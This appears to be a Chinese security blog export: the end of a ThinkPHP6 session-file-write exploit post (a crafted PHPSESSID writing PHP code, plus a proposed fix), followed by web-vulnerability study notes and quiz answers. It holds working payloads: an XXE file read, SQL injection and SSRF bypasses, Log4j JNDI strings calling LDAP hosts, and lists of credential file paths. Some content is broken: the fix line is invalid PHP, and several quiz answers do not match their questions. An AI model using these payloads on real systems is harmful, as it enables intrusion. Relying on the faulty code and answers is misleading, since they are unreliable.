&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容</p>\n<h4 id=\"2-利用\"><a href=\"#2-利用\" class=\"headerlink\" title=\"2.利用\"></a>2.利用</h4><p>直接用<code>burpsuite</code>先抓一个包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class=\"line\">Host: tp6.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里我们通过修改PHPSESSID来进行利用，</p>\n<p>值得注意的是这里我们构造的长度必须是**<u>32</u>**位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPSESSID=1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>\n\n<p>一般位于项目根目录下的.&#x2F;runtime&#x2F;session&#x2F;文件夹下，<br> 加上之前前缀的拼接，那就是<br> &#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png\"\n                        alt=\"图片-1667832045580\"\n                 ></p>\n<p>成功！</p>\n<h4 id=\"3-修复方法\"><a href=\"#3-修复方法\" class=\"headerlink\" title=\"3.修复方法\"></a>3.修复方法</h4><p>这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用<code>ctype_alnum</code>函数</p>\n<blockquote>\n<h2 id=\"PHP-ctype-alnum-函数-PHP-ctype-alnum-function\"><a href=\"#PHP-ctype-alnum-函数-PHP-ctype-alnum-function\" class=\"headerlink\" title=\"PHP ctype_alnum()函数 (PHP ctype_alnum() function)\"></a>PHP ctype_alnum()函数 <strong>(<strong>PHP ctype_alnum() function</strong>)</strong></h2><p><strong>ctype_alnum() function</strong> is a character type (CType) function in PHP, it is used to check whether a given string <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020\" >contains<i class=\"fas fa-external-link-alt\"></i></a> alphanumeric characters or not.</p>\n<p><strong>ctype_alnum()函数</strong>是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 </p>\n<p>It returns true – if the string contains alphanumeric value (i.e. alphabets, digits&#x2F;number only), else it returns false.</p>\n<p>它返回true -如果字符串包含字母数字值(即字母，数字只&#x2F;数字)，否则返回FALSE。 </p>\n</blockquote>\n<p>修改如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ctype_alnum（<span class=\"variable\">$id</span>） &amp;&amp; ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"web漏洞复习","date":"2022-03-10T15:21:37.000Z","excerpt":"web漏洞复习","_content":"\n# web漏洞复习\n\n### 1.owasp top 10\n\n```\n1.SQL注入\n2.失效的身份认证和会话管理\n3.跨站脚本攻击XSS\n4.直接引用不安全的对象\n5.安全配置错误\n6.敏感信息泄露\n7.缺少功能级的访问控制\n8.跨站请求伪造CSRF\n9.实验含有已知漏洞的组件\n10.未验证的重定向和转发\n```\n\n\n\n### 2.sql注入\n\n**sql注入原理**\n\n> 产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接\n>\n> 到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递\n>\n> 给后台SQL服务器时加以解析并执行。\n\n\n\n**sql注入类型**\n\n按照注入点类型分类可分为\n\n- 数字型注入\n- 字符型注入\n\n按照执行效果分类可分为\n\n- 盲注\n- 报错注入\n- 联合查询\n- 堆叠注入\n- 宽字节注入\n- 二次注入\n\n\n\n**sql注入危害**\n\n1. 攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。\n2. 可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。\n3. 如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。\n4. 经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。\n\n\n\n**报错注入常用函数**\n\n- updatexml()\n- extractvalue()\n- floor()\n\n\n\n**sql注入绕过**\n\n```\n绕过空格（注释符/* */，%a0）\n括号绕过空格\n引号绕过（使用十六进制）\n逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）\n比较符号（<>）绕过（使用greatest()）\nand=&&  or=||\n=  用 like 绕过\n大小写绕过\n双写绕过\n特殊编码绕过\n```\n\n\n\n**sql注入经常出现在什么地方**\n\n- 登录界面\n- 删除处\n- 搜索框\n\n**Sql server 相关知识**\n\nhttps://zhuanlan.zhihu.com/p/74546690\n\n\n\n### 3.文件上传\n\n**文件上传的危害？**\n\n> 文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的**网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果**\n>\n> \n\n\n\n**文件上传怎么防御**\n\n- 客户端检测检测（js检测）\n- 服务端检测(MIME检测)\n- 服务端检测（扩展名检测）\n- 增加白名单\n\n**文件上传怎么绕过(白名单，黑名单，前端等)？**\n\n- .htaccess绕过\n- .user.ini绕过\n- %00截断绕过\n\n\n\n### 3.SSRF漏洞\n\n> 漏洞原理 **SSRF**（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。\n\n\n\n**ssrf漏洞利用**\n\n- 能扫描内部网络，获取端口，服务信息\n- 攻击运行在内网或本地的应用程序。\n- 对内网web进行指纹识别\n- 对内部主机和端口发送请求包进行攻击\n- file协议读取本地文件\n\n\n\n**Ssrf漏洞防御**\n\n- 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求\n- 限制不能访问内网的IP，以防止对内网进行攻击\n- 屏蔽返回的详细信息\n\n\n\n**Ssrf漏洞绕过**\n\n- @符号绕过\n\n  ```\n  http://www.xxx.com@www.kxsy.work/\n  ```\n\n- IP地址转换\n\n  ```\n  例如：120.26.86.156\n  二进制 = 1111000000110100101011010011100\n  十六进制 = 0x781A569C\n  十进制 = 2014992028\n  ```\n\n- 转换短网址\n\n  ```\n  https://www.985.so/\n  例：http://www.kxsy.work/ = http://u6.gg/ks69x\n  ```\n\n- 特殊符号替换绕过\n\n  ```\n  例：\n  http://www.kxsy.work/ = http://www。kxsy。work/\n  localhost或者0.0.0.0\n  ```\n\n- 302跳转绕过\n\n  ```\n  <?php  \n  $schema = $_GET['s'];\n  $ip     = $_GET['i'];\n  $port   = $_GET['p'];\n  $query  = $_GET['q'];\n  if(empty($port)){  \n      header(\"Location: $schema://$ip/$query\"); \n  } else {\n      header(\"Location: $schema://$ip:$port/$query\"); \n  }\n  ```\n\n- xio.ip绕过，会解析到子域\n\n  ```\n  http://10.0.0.1.xip.io = 10.0.0.1\n  www.10.0.0.1.xip.io= 10.0.0.1\n  http://mysite.10.0.0.1.xip.io = 10.0.0.1\n  foo.http://bar.10.0.0.1.xip.io = 10.0.0.1\n  10.0.0.1.xip.name resolves to 10.0.0.1\n  www.10.0.0.2.xip.name resolves to 10.0.0.2\n  foo.10.0.0.3.xip.name resolves to 10.0.0.3\n  bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n  ```\n\n- 用Enclosed alphanumerics绕过\n\n  ```\n  利用Enclosed alphanumerics\n  ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com\n  ```\n\n  \n\n\n\n### 4.XXE漏洞\n\n**XXE漏洞原理**\n\n> XXE全称为XML External Entity Injection即XMl外部实体注入漏洞\n\nXXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成\n\n\n\n**XXE漏洞利用**\n\n在php环境下\n\n```\n<?php\n$xml=simplexml_load_string($_GET['xml']);\nprint_r($xml);\n?>\t\n```\n\n将以下xml代码进行URL编码，读取文件\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE playwin [\n<!ENTITY name SYSTEM \"file:///D:/phpStudy/PHPTutorial/WWW/1.txt\">\n]>\n<resume>\n<name> &name; </name>\n</resume>\n```\n\n\n\n\n\n**Xxe漏洞支持的伪协议**\n\n不同的程序支持协议不同\n\n\n\n### 5.文件包含漏洞\n\n**文件包含的函数**\n\nphp中有四种\n\n```\nrequire() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行\n\nrequire_once() // 如果一个文件已经被包含过，则不会在包含它\n\ninclude() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行\n\ninclude_once() // 如果一个文件已经被包含过，则不会在包含它\n```\n\n\n\n**文件包含支持的伪协议**\n\n```\nphp的支持\nphp://filter\nphp://input\nfile://\nphar://\nzip://\ndata://\n```\n\n\n\n**文件包含利用**\n\n\n\n包含日志文件getshell\n\n包含敏感文件\n\n```\nC:\\boot.ini //查看系统版本\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件\nC:\\Windows\\repair\\sam //存储系统初次安装的密码\nC:\\Program Files\\mysql\\my.ini //Mysql配置\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\Windows\\php.ini //php配置信息\nC:\\Windows\\my.ini //Mysql配置信息\nC:\\Windows\\win.ini //Windows系统的一个基本系统配置文件\n```\n\n\n\n\n\n### 6.Php命令执行，php代码执行相\n\n**代码执行相关函数**\n\n```\nassert()\neval()\ncall_user_func()\ncall_user_func_array()\npreg_replace()  //7.0版本后已经不存在\narray_map()\nUsort()\n```\n\n**命令执行相关函数**\n\n```\nsystem()\nexec()\npassthru()\nshell_exec()\npoopen()\n```\n\n\n\n### 7.XSS漏洞\n\n**XSS漏洞原理**\n\n> HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（<）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞\n\n\n\n**xss漏洞类型**\n\n\n\n> 1.反射型\n>\n> 反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。\n>\n> 对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。\n>\n> 此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。\n> 2.存储型\n>\n> 攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。\n>\n> 存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。\n> 3.DOM型\n>\n> 客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。\n\n\n\n**Dom型xss和反射型xss的区别**\n\nDOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的\n\n\n\n**Xss漏洞的危害**\n\n```\n1.窃取用户Cookie\n2.后台增删改文章\n3.XSS钓鱼攻击\n4.利用XSS漏洞进行传播和修改网页代码\n5.XSS蠕虫攻击\n6.网站重定向\n7.获取键盘记录\n8.获取用户信息等\n```\n\n\n\n**XSS漏洞防御**\n\n> 1、对输入和URL参数进行过滤(白名单和黑名单)\n>\n> 检查用户输入的数据中是否包含一些特殊字符，如<、>、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。\n> 2、HTML实体编码\n>\n> 字符串js编码转换成实体html编码的方法（防范XSS攻击）\n> https://www.cnblogs.com/dearxinli/p/5466286.html\n> 3、对输出内容进行编码\n>\n> 在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。\n\n\n\n### 8.常见的解析漏洞\n\n**Nginx**\n\n> https://blog.csdn.net/Spontaneous_0/article/details/129106641\n\n**Apache**\n\n> https://blog.csdn.net/weixin_44174581/article/details/119387616\n\n**lls**\n\n> https://blog.csdn.net/weixin_43625577/article/details/91971796\n\n\n\n### 9.常见的漏扫工具支持扫描的漏洞类型\n\n **Xray**\n\n```\nXSS漏洞检测 (key: xss)\nSQL 注入检测 (key: sqldet)\n命令/代码注入检测 (key: cmd-injection)\n目录枚举 (key: dirscan)\n路径穿越检测 (key: path-traversal)\nXML 实体注入检测 (key: xxe)\n文件上传检测 (key: upload)\n弱口令检测 (key: brute-force)\njsonp 检测 (key: jsonp)\nssrf 检测 (key: ssrf)\n基线检查 (key: baseline)\n任意跳转检测 (key: redirect)\nCRLF 注入 (key: crlf-injection)\nStruts2 系列漏洞检测 (高级版，key: struts)\nThinkphp系列漏洞检测 (高级版，key: thinkphp)\nPOC 框架 (key: phantasm)\n```\n\nAvws\n\n```\n1.WebScanner：全站扫描，Web安全漏洞扫描\n2.Site Crawler：爬虫功能，遍历站点目录结构\n3.Target Finder：端口扫描，找出web服务器\n4.Subdomain Scanner：子域名扫描器，利用DNS查询\n5.Blind SQL Injector：盲注工具\n6.HTTP Editor：http协议数据包编辑器\n7.HTTP Sniffer：HTTP协议嗅探器\n8.HTTP Fuzzer：模糊测试工具\n9.Authentication Tester：Web认证破解工具\n10.Web Srevice Scanner：Web服务扫描器\n11.Web Srevice Editor：Web服务编辑器\n```\n\n\n\n### 10.sqlmap工具参数的使用和含义\n\n- `-v` 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面\n- `-u`指定一个url连接，url中必须要有 `?xx=xxx` 才行\n- `-r`可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标\n- `--data=Data`指明参数是哪些。例：`-u \"www.abc.com/index.php?id=1\" --data=\"name=1&pass=2\"`\n- `--random-agent`使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在`sqlmap/txt/user-agent.txt` **在level>=3时会检测user-agent注入。**\n- `--os-shell`创建一个对方操作系统的shell，metepreter或VNC\n- `--cookie`指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： `-u \"www.abc.com/index.php?id=1\"`\n\n\n\n### 11.一些常见漏洞\n\n\n\n##### **Tomcat**\n\n任意命令执行\n\nhttps://zhuanlan.zhihu.com/p/137686820\n\n\n\n##### iis\n\n目录解析漏洞\n\n文件名解析漏洞\n\n畸形解析漏洞\n\niis短文件漏洞\n\nPUT任意文件写入\n\nhttps://blog.csdn.net/weixin_42918771/article/details/105178309\n\n\n\n##### apache\n\n换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞\n\n，路径穿越漏洞\n\nhttps://blog.csdn.net/weixin_44268918/article/details/129129214\n\n\n\n**Fastbin**\n\n跟pwn有关，暂时没弄懂\n\nhttps://www.freebuf.com/articles/web/263598.html\n\n\n\n\n\n### 12.Cobalt strike,mimikatz工具的一些基础知识\n\n\n\n太多了，附上一个链接\n\nhttps://www.freebuf.com/articles/network/290134.html\n\n\n\n### 13.常见框架漏洞\n\n\n\n##### Jboss\n\n- **访问控制不严导致的漏洞**\n- **反序列化导致的漏洞**\n\n\n\nhttps://blog.csdn.net/m0_58434634/article/details/117434173\n\n\n\n##### weblogic\n\n- 弱口令漏洞\n- 任意文件上传漏洞\n- XML Decoder反序列化漏洞\n- webligic-SSRF漏洞\n- java反序列化漏洞\n\nhttps://www.cnblogs.com/-mo-/p/11503707.html\n\n\n\n##### thinkphp\n\n- 远程代码执行漏洞\n\nhttps://www.cnblogs.com/lingzhisec/p/15728886.html\n\n\n\n##### Struts2\n\nhttps://blog.csdn.net/HBohan/article/details/122667891\n\n\n\n##### Shiro\n\n- 反序列化漏洞\n\nhttps://www.freebuf.com/vuls/283810.html\n\n\n\n### 14.常见端口对应的漏洞\n\n```\n20：FTP服务的数据传输端口\n21：FTP服务的连接端口，可能存在  弱口令暴力破解\n22：SSH服务端口，可能存在 弱口令暴力破解\n23：Telnet端口，可能存在 弱口令暴力破解\n25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应\n43：whois服务端口\n53：DNS服务端口(TCP/UDP 53)\n67/68：DHCP服务端口\n69：TFTP端口，可能存在弱口令\n80：HTTP端口，常见web漏洞\n88：Kerberos协议端口\n110：POP3邮件服务端口，和SMTP的25端口对应\n135：RPC服务\n137/138： NMB服务\n139：SMB/CIFS服务\n143：IMAP协议端口\n161/162: Snmp服务，public弱口令\n389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口\n443：HTTPS端口，心脏滴血等与SSL有关的漏洞\n445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010\n512/513/514：Linux Rexec服务端口，可能存在爆破\n636：LDAPS目录访问协议，域控才会开放此端口\n873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞\n1080：socket端口，可能存在爆破\n1099：RMI，可能存在 RMI反序列化漏洞\n1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露\n1414：IBM WebSphere MQ服务端口\n1433：SQL Server对外提供服务端口\n1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口\n1521：oracle数据库端口\n2049：NFS服务端口，可能存在NFS配置不当\n2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞\n2375：Docker端口，可能存在 Docker未授权访问漏洞\n2601:   Zebra ，默认密码zebr\n3128:   squid ，匿名访问（可能内网漫游)\n3268：LDAP目录访问协议，有可能存在注入、弱口令\n3306：MySQL数据库端口，可能存在 弱口令暴力破解\n3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现\n3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞\n4440：Rundeck，弱口令admin\n4560：log4j SocketServer监听的端口，可能存在 log4j<=1.2.17反序列化漏洞（CVE-2019-17571）\n4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)\n4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin\n5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞\n5432：PostGreSQL数据库的端口\n5632：PyAnywhere服务端口，可能存在代码执行漏洞\n5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞\n5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞\n6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞\n7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞\n7180：Cloudera manager端口\n8000：JDWP，可能存在JDWP远程代码执行漏洞。\n8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞\n8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell\n8080-8090：可能存在web服务\n8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞\n8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）\n9000：fastcgi端口，可能存在远程命令执行漏洞\n9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)\n9043/9090：WebSphere，可能存在WebSphere反序列化漏洞\n9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞\n10000：Webmin-Web控制面板，可能存在弱口令\n10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)\n11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞\n27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞\n50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。\n50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞\n61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现\n60020：hbase.regionserver.port，HRegionServer的RPC端口\n60030：hbase.regionserver.info.port，HRegionServer的http端口\n\n```\n\n\n\n\n\n### 15.一些最新的漏洞\n\n##### Log4j2\n\nhttps://juejin.cn/post/7202514143341002789\n\n\n\n##### spring-core-rce-2022-03-29\n\nhttps://blog.csdn.net/weixin_45632448/article/details/124190382\n\n\n\n\n\n### 16.常见的web漏洞\n\n- 任意文件上传\n- 任意文件下载\n- 逻辑漏洞\n- 反序列化漏洞\n\n\n\n\n\n### \n\n## \n\n\n\n-------------------------------------------------------------------------------------------------------------------------------\n\n\n\n# 练习思考题\n\n\n\n### 1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？\n\n1. Windows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。\n2. Windows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 连接回攻击者的主机。\n3. Windows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。\n4. Beacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。\n5. Linux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。\n6. Mac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。\n\n\n\n### 2.6379,8009端口对应的漏洞是\n\n- 6379是redis未授权访问漏洞\n- 8009是`Apache-Tomcat-Ajp漏洞`，tomcat默认开启ajp服务（8009端口）\n\n\n\n### 3.Cobalt strike 可以生成哪些类型的shellcode?\n\n搜不到。。。\n\n\n\n### 4.Apache 文件解析漏洞的原理？\n\n> apache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。\n\n当phpinfo.php被禁止时，phpinfo.php.abc可执行\n\n\n\n### 5. 什么中间件存在短文件名漏洞？\n\n\n\n**iis**\n\n\n\n### 6.xxe漏洞各个语言支持的伪协议有哪些\n\n可利用php://filter伪协议\n\n\n\n### 7.S2_052漏洞是由于什么造成的？\n\n此漏洞主要是由于**JBoss中 /jmx-console/HtmlAdaptor 路径对外开放**，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。\n\n\n\n### 8.Weblogic 常见的漏洞有哪些？\n\n- **XMLDecoder反序列化漏洞**\n- **T3协议反序列化漏洞**\n- **未授权访问漏洞**\n- **命令执行漏洞**\n- **IIOP协议反序列化漏洞**\n- **SSRF漏洞**\n\n\n\n### 9.Jboss 常见的漏洞有哪些？\n\n- **访问控制不严导致的漏洞**\n- **反序列化导致的漏洞**\n\n\n\n### 10.Struts2 常见的漏洞有哪些？\n\n- 反序列化漏洞\n\n\n\n### 11.Fastbin 怎么利用？\n\n使用流程如下：\n\n1. 申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。\n2. 重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。\n3. 利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。\n4. 再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。\n\n\n\n### 12.Ssrf 攻击的目标为？\n\n**<u>外网无法访问的内部系统</u>**\n\n\n\n### 13.ssrf 是否可以通过过滤get或post参数进行防御？\n\n不行\n\n\n\n### 14.Log4j 怎么绕过？\n\n- **不出现port，避免被waf匹配ip:port**\n\n  ```\n  ${jndi:ldap:192.168.1.1/a}\n   ${jndi:ldap:192.168.1.1:/a} \n  注意此时需要ldap服务端口为389\n  \n  ```\n\n  \n\n- **对IP添加包裹**\n\n  ```\n  ${jndi:ldap://[192.168.34.96]/a} \n  ${jndi:ldap://[192.168.34.96]]/a} \n   LdapURL取出\"[ip]\"，LdapCtx去除[]获得ip，两种情况下端口都是389\n  \n  ```\n\n\n\n### 15.ogg是否是php的伪协议？\n\n不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file://表示文件协议，http://表示HTTP协议等。\n\n\n\n### 16. Zip://伪协议利用对应的php版本号为？\n\n`zip://` 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。\n\n\n\n### 17.文件上传怎么绕过黑名单.asp后缀的过滤？\n\n\n\n\n\n### 18.Nginx,apache是否存在弱口令？\n\n均存在\n\n\n\n### 19.Dom xss和反射型xss的区别是什么？\n\n> DOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。\n\n\n\n### 20.Ms17_010漏洞是那个端口造成的？\n\n445端口\n\n\n\n### 21.Sqlmap 中要使用随机user-agent应该使用什么参数？\n\n```\n--random-agent\n```\n\n\n\n### 22.Xp_cmdshell 是那个数据库中含有的？\n\n` Microsoft SQL Server 数据库`\n\n\n\n### 23.Symlink函数是否可以执行系统命令？\n\n不可以\n\n\n\n### 24.Samba wannacry溢出漏洞怎么修复？\n\n- 升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。\n- 禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。\n- 更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。\n- 加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。\n- 实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。","source":"_posts/web漏洞复习.md","raw":"---\ntitle: web漏洞复习\ndate: 2022-03-10 